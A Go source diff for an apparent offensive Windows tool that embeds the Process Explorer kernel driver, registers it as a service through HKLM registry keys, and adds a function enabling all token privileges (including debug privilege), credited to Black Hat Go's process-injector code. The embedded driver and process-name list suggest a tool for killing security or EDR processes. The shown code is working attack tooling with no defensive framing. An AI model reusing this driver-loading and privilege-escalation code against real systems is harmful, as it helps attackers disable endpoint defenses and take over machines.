@@ -8,6 +8,8 @@ import (
 	"path/filepath"
 	"strings"
 
+	"github.com/fourcorelabs/wintoken"
+	"golang.org/x/sys/windows"
 	"golang.org/x/sys/windows/registry"
 )
 
@@ -16,6 +18,22 @@ var content_processes string
 
 //go:embed Resources/PROCEXP.sys
 var driver []byte
+
+func adjust_privilege() error {
+	// thanks to https://github.com/blackhat-go/bhg/blob/7d3318a7a60b7bedc876f8f328ec8e1cbe64c5bc/ch-12/procInjector/winsys/token.go#L55
+
+	current_pid := windows.Getpid()
+
+	token, err := wintoken.OpenProcessToken(current_pid, wintoken.TokenPrimary)
+	if err != nil {
+		return errors.New("[-] Error while getting current token handle")
+	}
+	defer token.Close()
+
+	token.EnableAllPrivileges()
+
+	return nil
+}
 
 func remove_registry_keys(drivername, driverpath string) error {
 	err := registry.DeleteKey(registry.LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\"+drivername)
@@ -124,7 +142,7 @@ func check(e error) {
 
 func main() {
 	const DRIVERNAME string = "ProcExp64"
-	var SE_DEBUG_NAME = [17]uint16{83, 101, 68, 101, 98, 117, 103, 80, 114, 105, 118, 105, 108, 101, 103, 101, 0}
+	//var SE_DEBUG_NAME = [17]uint16{83, 101, 68, 101, 98, 117, 103, 80, 114, 105, 118, 105, 108, 101, 103, 101, 0}
 
 	//fmt.Println("Run this tool as SYSTEM for maximum effect")
 
@@ -149,7 +167,9 @@ func main() {
 	fmt.Println("[+] Successfully wrote registry keys")
 	defer remove_registry_keys(DRIVERNAME, driverpath)
 
-	fmt.Println(SE_DEBUG_NAME)
+	err = adjust_privilege()
+
+	//fmt.Println(SE_DEBUG_NAME)
 	process_list := load_process_names(content_processes)
 	fmt.Println(process_list)
 }
